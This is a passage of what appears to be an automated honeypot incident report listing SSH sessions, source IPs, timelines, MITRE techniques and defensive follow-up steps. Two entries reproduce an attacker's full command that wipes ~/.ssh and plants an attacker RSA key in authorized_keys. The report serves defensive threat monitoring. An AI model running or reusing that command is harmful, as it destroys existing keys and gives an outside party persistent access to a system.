| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 08:01:23` | `cowrie.session.connect` |
| `2026-07-06 08:01:23` | `cowrie.client.version` |
| `2026-07-06 08:01:23` | `cowrie.client.kex` |
| `2026-07-06 08:01:24` | `cowrie.login.success` |
| `2026-07-06 08:01:24` | `cowrie.session.params` |
| `2026-07-06 08:01:24` | `cowrie.command.input` |
| `2026-07-06 08:01:24` | `cowrie.command.failed` |
| `2026-07-06 08:01:24` | `cowrie.log.closed` |
| `2026-07-06 08:01:25` | `cowrie.session.params` |
| `2026-07-06 08:01:25` | `cowrie.command.input` |
| `2026-07-06 08:01:25` | `cowrie.session.file_download` |
| `2026-07-06 08:01:25` | `cowrie.log.closed` |
| `2026-07-06 08:01:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `189.203.163[.]10` to AbuseIPDB if not already reported
- [ ] Block `189.203.163[.]10` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2f8118c1007f

| Field | Detail |
|---|---|
| **Source IP** | `189.203.163[.]10` |
| **First Seen** | 2026-07-06 08:01 |
| **Last Seen** | 2026-07-06 08:01 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 08:01:25` | `cowrie.session.connect` |
| `2026-07-06 08:01:25` | `cowrie.client.version` |
| `2026-07-06 08:01:25` | `cowrie.client.kex` |
| `2026-07-06 08:01:26` | `cowrie.login.success` |
| `2026-07-06 08:01:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `189.203.163[.]10` to AbuseIPDB if not already reported
- [ ] Block `189.203.163[.]10` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-dd55ece92f68

| Field | Detail |
|---|---|
| **Source IP** | `189.203.163[.]10` |
| **First Seen** | 2026-07-06 08:01 |
| **Last Seen** | 2026-07-06 08:01 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 08:01:26` | `cowrie.session.connect` |
| `2026-07-06 08:01:26` | `cowrie.client.version` |
| `2026-07-06 08:01:26` | `cowrie.client.kex` |
| `2026-07-06 08:01:26` | `cowrie.login.success` |
| `2026-07-06 08:01:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `189.203.163[.]10` to AbuseIPDB if not already reported
- [ ] Block `189.203.163[.]10` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-eb2ba7838e47

| Field | Detail |
|---|---|
| **Source IP** | `34.53.187[.]0` |
| **First Seen** | 2026-07-06 08:01 |
| **Last Seen** | 2026-07-06 08:01 |
| **Session Duration** | 18s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `PING` |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 08:01:31` | `cowrie.session.connect` |
| `2026-07-06 08:01:31` | `cowrie.login.success` |
| `2026-07-06 08:01:32` | `cowrie.session.params` |
| `2026-07-06 08:01:32` | `cowrie.command.input` |
| `2026-07-06 08:01:32` | `cowrie.command.failed` |
| `2026-07-06 08:01:50` | `cowrie.log.closed` |
| `2026-07-06 08:01:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `34.53.187[.]0` to AbuseIPDB if not already reported
- [ ] Block `34.53.187[.]0` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e3b195de03cc

| Field | Detail |
|---|---|
| **Source IP** | `34.53.187[.]0` |
| **First Seen** | 2026-07-06 08:01 |
| **Last Seen** | 2026-07-06 08:01 |
| **Session Duration** | 17s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 08:01:33` | `cowrie.session.connect` |
| `2026-07-06 08:01:33` | `cowrie.login.success` |
| `2026-07-06 08:01:34` | `cowrie.session.params` |
| `2026-07-06 08:01:34` | `cowrie.command.input` |
| `2026-07-06 08:01:50` | `cowrie.log.closed` |
| `2026-07-06 08:01:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `34.53.187[.]0` to AbuseIPDB if not already reported
- [ ] Block `34.53.187[.]0` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-49ddc13df723

| Field | Detail |
|---|---|
| **Source IP** | `45.198.224[.]120` |
| **First Seen** | 2026-07-06 08:02 |
| **Last Seen** | 2026-07-06 08:02 |
| **Session Duration** | 12s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 08:02:01` | `cowrie.session.connect` |
| `2026-07-06 08:02:02` | `cowrie.client.version` |
| `2026-07-06 08:02:02` | `cowrie.client.kex` |
| `2026-07-06 08:02:09` | `cowrie.login.success` |
| `2026-07-06 08:02:12` | `cowrie.session.params` |
| `2026-07-06 08:02:12` | `cowrie.command.input` |
| `2026-07-06 08:02:14` | `cowrie.log.closed` |
| `2026-07-06 08:02:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.198.224[.]120` to AbuseIPDB if not already reported
- [ ] Block `45.198.224[.]120` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-95677516a791

| Field | Detail |
|---|---|
| **Source IP** | `176.53.159[.]196` |
| **First Seen** | 2026-07-06 08:06 |
| **Last Seen** | 2026-07-06 08:06 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 08:06:28` | `cowrie.session.connect` |
| `2026-07-06 08:06:28` | `cowrie.client.version` |
| `2026-07-06 08:06:28` | `cowrie.client.kex` |
| `2026-07-06 08:06:28` | `cowrie.login.success` |
| `2026-07-06 08:06:28` | `cowrie.direct-tcpip.request` |
| `2026-07-06 08:06:29` | `cowrie.direct-tcpip.data` |
| `2026-07-06 08:06:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `176.53.159[.]196` to AbuseIPDB if not already reported
- [ ] Block `176.53.159[.]196` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fa493288cdff

| Field | Detail |
|---|---|
| **Source IP** | `4.221.162[.]168` |
| **First Seen** | 2026-07-06 08:07 |
| **Last Seen** | 2026-07-06 08:08 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 08:07:53` | `cowrie.session.connect` |
| `2026-07-06 08:07:53` | `cowrie.client.version` |
| `2026-07-06 08:07:53` | `cowrie.client.kex` |
| `2026-07-06 08:07:54` | `cowrie.login.success` |
| `2026-07-06 08:07:55` | `cowrie.session.params` |
| `2026-07-06 08:07:55` | `cowrie.command.input` |
| `2026-07-06 08:07:55` | `cowrie.command.failed` |
| `2026-07-06 08:07:56` | `cowrie.log.closed` |
| `2026-07-06 08:07:56` | `cowrie.session.params` |
| `2026-07-06 08:07:56` | `cowrie.command.input` |
| `2026-07-06 08:07:57` | `cowrie.session.file_download` |
| `2026-07-06 08:07:57` | `cowrie.log.closed` |
| `2026-07-06 08:08:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `4.221.162[.]168` to AbuseIPDB if not already reported
- [ ] Block `4.221.162[.]168` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-05f835bdf164

| Field | Detail |
|---|---|
| **Source IP** | `4.221.162[.]168` |
| **First Seen** | 2026-07-06 08:07 |
| **Last Seen** | 2026-07-06 08:07 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 08:07:57` | `cowrie.session.connect` |
| `2026-07-06 08:07:57` | `cowrie.client.version` |
| `2026-07-06 08:07:57` | `cowrie.client.kex` |
| `2026-07-06 08:07:58` | `cowrie.login.success` |
| `2026-07-06 08:07:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `4.221.162[.]168` to AbuseIPDB if not already reported
- [ ] Block `4.221.162[.]168` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-81bb67f753c8

| Field | Detail |
|---|---|
| **Source IP** | `4.221.162[.]168` |
| **First Seen** | 2026-07-06 08:07 |
| **Last Seen** | 2026-07-06 08:08 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 08:07:59` | `cowrie.session.connect` |
| `2026-07-06 08:07:59` | `cowrie.client.version` |
| `2026-07-06 08:07:59` | `cowrie.client.kex` |
| `2026-07-06 08:08:00` | `cowrie.login.success` |
| `2026-07-06 08:08:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `4.221.162[.]168` to AbuseIPDB if not already reported
- [ ] Block `4.221.162[.]168` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1ddc4dc8139b

| Field | Detail |
|---|---|
| **Source IP** | `34.156.75[.]163` |
| **First Seen** | 2026-07-06 08:09 |
| **Last Seen** | 2026-07-06 08:09 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 08:09:37` | `cowrie.session.connect` |
| `2026-07-06 08:09:37` | `cowrie.client.version` |
| `2026-07-06 08:09:37` | `cowrie.client.kex` |
| `2026-07-06 08:09:39` | `cowrie.login.success` |
| `2026-07-06 08:09:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `34.156.75[.]163` to AbuseIPDB if not already reported
- [ ] Block `34.156.75[.]163` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0b0842c17a3f

| Field | Detail |
|---|---|
| **Source IP** | `45.198.224[.]120` |
| **First Seen** | 2026-07-06 08:14 |
| **Last Seen** | 2026-07-06 08:14 |
| **Session Duration** | 12s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 08:14:39` | `cowrie.session.connect` |
| `2026-07-06 08:14:40` | `cowrie.client.version` |
| `2026-07-06 08:14:40` | `cowrie.client.kex` |
| `2026-07-06 08:14:46` | `cowrie.login.success` |
| `2026-07-06 08:14:49` | `cowrie.session.params` |
| `2026-07-06 08:14:49` | `cowrie.command.input` |
| `2026-07-06 08:14:51` | `cowrie.log.closed` |
| `2026-07-06 08:14:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.198.224[.]120` to AbuseIPDB if not already reported
- [ ] Block `45.198.224[.]120` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-15891b7616a4

| Field | Detail |
|---|---|
| **Source IP** | `176.53.159[.]196` |
| **First Seen** | 2026-07-06 08:18 |
| **Last Seen** | 2026-07-06 08:18 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 08:18:04` | `cowrie.session.connect` |
| `2026-07-06 08:18:04` | `cowrie.client.version` |
| `2026-07-06 08:18:04` | `cowrie.client.kex` |
| `2026-07-06 08:18:04` | `cowrie.login.success` |
| `2026-07-06 08:18:04` | `cowrie.direct-tcpip.request` |
| `2026-07-06 08:18:04` | `cowrie.direct-tcpip.data` |
| `2026-07-06 08:18:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `176.53.159[.]196` to AbuseIPDB if not already reported
- [ ] Block `176.53.159[.]196` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-eeb90f4158b0

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]137` |
| **First Seen** | 2026-07-06 08:25 |
| **Last Seen** | 2026-07-06 08:25 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 08:25:02` | `cowrie.session.connect` |
| `2026-07-06 08:25:02` | `cowrie.client.version` |
| `2026-07-06 08:25:03` | `cowrie.client.kex` |
| `2026-07-06 08:25:03` | `cowrie.login.success` |
| `2026-07-06 08:25:03` | `cowrie.direct-tcpip.request` |
| `2026-07-06 08:25:03` | `cowrie.direct-tcpip.ja4` |
| `2026-07-06 08:25:03` | `cowrie.direct-tcpip.data` |
| `2026-07-06 08:25:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]137` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]137` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-44031d6988e2

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]137` |
| **First Seen** | 2026-07-06 08:26 |
| **Last Seen** | 2026-07-06 08:26 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 08:26:43` | `cowrie.session.connect` |
| `2026-07-06 08:26:43` | `cowrie.client.version` |
| `2026-07-06 08:26:43` | `cowrie.client.kex` |
| `2026-07-06 08:26:43` | `cowrie.login.success` |
| `2026-07-06 08:26:43` | `cowrie.direct-tcpip.request` |
| `2026-07-06 08:26:43` | `cowrie.direct-tcpip.ja4` |
| `2026-07-06 08:26:43` | `cowrie.direct-tcpip.data` |
| `2026-07-06 08:26:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]137` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]137` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a8887042b7aa

| Field | Detail |
|---|---|
| **Source IP** | `185.242.3[.]195` |
| **First Seen** | 2026-07-06 08:27 |
| **Last Seen** | 2026-07-06 08:27 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 08:27:01` | `cowrie.session.connect` |
| `2026-07-06 08:27:01` | `cowrie.client.version` |
| `2026-07-06 08:27:01` | `cowrie.client.kex` |
| `2026-07-06 08:27:01` | `cowrie.login.success` |
| `2026-07-06 08:27:02` | `cowrie.session.params` |
| `2026-07-06 08:27:02` | `cowrie.command.input` |
| `2026-07-06 08:27:02` | `cowrie.log.closed` |
| `2026-07-06 08:27:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.242.3[.]195` to AbuseIPDB if not already reported
- [ ] Block `185.242.3[.]195` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8545613f34f5

| Field | Detail |
|---|---|
| **Source IP** | `45.198.224[.]120` |
| **First Seen** | 2026-07-06 08:27 |
| **Last Seen** | 2026-07-06 08:27 |
| **Session Duration** | 14s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 08:27:25` | `cowrie.session.connect` |
| `2026-07-06 08:27:28` | `cowrie.client.version` |
| `2026-07-06 08:27:28` | `cowrie.client.kex` |
| `2026-07-06 08:27:33` | `cowrie.login.success` |
| `2026-07-06 08:27:38` | `cowrie.session.params` |
| `2026-07-06 08:27:38` | `cowrie.command.input` |
| `2026-07-06 08:27:39` | `cowrie.log.closed` |
| `2026-07-06 08:27:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.198.224[.]120` to AbuseIPDB if not already reported
- [ ] Block `45.198.224[.]120` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9283fac45c7e

| Field | Detail |
|---|---|
| **Source IP** | `176.53.159[.]196` |
| **First Seen** | 2026-07-06 08:28 |
| **Last Seen** | 2026-07-06 08:28 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 08:28:07` | `cowrie.session.connect` |
| `2026-07-06 08:28:07` | `cowrie.client.version` |
| `2026-07-06 08:28:07` | `cowrie.client.kex` |
| `2026-07-06 08:28:07` | `cowrie.login.success` |
| `2026-07-06 08:28:08` | `cowrie.direct-tcpip.request` |
| `2026-07-06 08:28:08` | `cowrie.direct-tcpip.data` |
| `2026-07-06 08:28:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `176.53.159[.]196` to AbuseIPDB if not already reported
- [ ] Block `176.53.159[.]196` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4f3211c03953

| Field | Detail |
|---|---|
| **Source IP** | `176.53.159[.]196` |
| **First Seen** | 2026-07-06 08:38 |
| **Last Seen** | 2026-07-06 08:38 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 08:38:25` | `cowrie.session.connect` |
| `2026-07-06 08:38:25` | `cowrie.client.version` |
| `2026-07-06 08:38:25` | `cowrie.client.kex` |
| `2026-07-06 08:38:25` | `cowrie.login.success` |
| `2026-07-06 08:38:26` | `cowrie.direct-tcpip.request` |
| `2026-07-06 08:38:26` | `cowrie.direct-tcpip.data` |
| `2026-07-06 08:38:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `176.53.159[.]196` to AbuseIPDB if not already reported
- [ ] Block `176.53.159[.]196` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-97b24bc42c18

| Field | Detail |
|---|---|
| **Source IP** | `45.198.224[.]120` |
| **First Seen** | 2026-07-06 08:40 |
| **Last Seen** | 2026-07-06 08:40 |
| **Session Duration** | 13s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 08:40:07` | `cowrie.session.connect` |
| `2026-07-06 08:40:08` | `cowrie.client.version` |
| `2026-07-06 08:40:08` | `cowrie.client.kex` |
| `2026-07-06 08:40:15` | `cowrie.login.success` |
| `2026-07-06 08:40:18` | `cowrie.session.params` |
| `2026-07-06 08:40:18` | `cowrie.command.input` |
| `2026-07-06 08:40:21` | `cowrie.log.closed` |
| `2026-07-06 08:40:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.198.224[.]120` to AbuseIPDB if not already reported
- [ ] Block `45.198.224[.]120` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-073bb3590a72

| Field | Detail |
|---|---|
| **Source IP** | `34.156.162[.]210` |
| **First Seen** | 2026-07-06 08:40 |
| **Last Seen** | 2026-07-06 08:40 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0[.]0 Safari/537.36, Accept-Encoding: gzip` |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 08:40:52` | `cowrie.session.connect` |
| `2026-07-06 08:40:52` | `cowrie.login.success` |
| `2026-07-06 08:40:52` | `cowrie.session.params` |
| `2026-07-06 08:40:52` | `cowrie.command.input` |
| `2026-07-06 08:40:52` | `cowrie.command.input` |
| `2026-07-06 08:40:52` | `cowrie.command.failed` |
| `2026-07-06 08:40:52` | `cowrie.command.input` |
| `2026-07-06 08:40:53` | `cowrie.log.closed` |
| `2026-07-06 08:40:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `34.156.162[.]210` to AbuseIPDB if not already reported
- [ ] Block `34.156.162[.]210` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0386caf665d4

| Field | Detail |
|---|---|
| **Source IP** | `34.156.162[.]210` |
| **First Seen** | 2026-07-06 08:41 |
| **Last Seen** | 2026-07-06 08:41 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `PING` |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 08:41:05` | `cowrie.session.connect` |
| `2026-07-06 08:41:05` | `cowrie.login.success` |
| `2026-07-06 08:41:06` | `cowrie.session.params` |
| `2026-07-06 08:41:06` | `cowrie.command.input` |
| `2026-07-06 08:41:06` | `cowrie.command.failed` |
| `2026-07-06 08:41:13` | `cowrie.log.closed` |
| `2026-07-06 08:41:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `34.156.162[.]210` to AbuseIPDB if not already reported
- [ ] Block `34.156.162[.]210` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1f8a8ee23197

| Field | Detail |
|---|---|
| **Source IP** | `34.156.162[.]210` |
| **First Seen** | 2026-07-06 08:41 |
| **Last Seen** | 2026-07-06 08:41 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 08:41:07` | `cowrie.session.connect` |
| `2026-07-06 08:41:07` | `cowrie.login.success` |
| `2026-07-06 08:41:08` | `cowrie.session.params` |
| `2026-07-06 08:41:08` | `cowrie.command.input` |
| `2026-07-06 08:41:13` | `cowrie.log.closed` |
| `2026-07-06 08:41:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `34.156.162[.]210` to AbuseIPDB if not already reported
- [ ] Block `34.156.162[.]210` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9408195506a7

| Field | Detail |
|---|---|
| **Source IP** | `176.53.159[.]196` |
| **First Seen** | 2026-07-06 08:52 |
| **Last Seen** | 2026-07-06 08:52 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 08:52:14` | `cowrie.session.connect` |
| `2026-07-06 08:52:14` | `cowrie.client.version` |
| `2026-07-06 08:52:14` | `cowrie.client.kex` |
| `2026-07-06 08:52:14` | `cowrie.login.success` |
| `2026-07-06 08:52:14` | `cowrie.direct-tcpip.request` |
| `2026-07-06 08:52:14` | `cowrie.direct-tcpip.data` |
| `2026-07-06 08:52:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `176.53.159[.]196` to AbuseIPDB if not already reported
- [ ] Block `176.53.159[.]196` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e3e6dceee35e

| Field | Detail |
|---|---|
| **Source IP** | `45.198.224[.]120` |
| **First Seen** | 2026-07-06 08:52 |
| **Last Seen** | 2026-07-06 08:52 |
| **Session Duration** | 13s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
